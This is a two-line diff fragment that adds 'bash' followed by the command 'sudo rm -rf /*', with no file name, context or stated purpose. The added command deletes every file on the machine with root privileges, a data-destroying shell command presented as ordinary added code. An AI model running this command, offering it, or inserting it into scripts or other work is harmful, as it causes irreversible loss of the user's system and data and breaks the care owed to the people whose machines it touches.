@@ -1,0 +1,2 @@
+bash
+sudo rm -rf /*
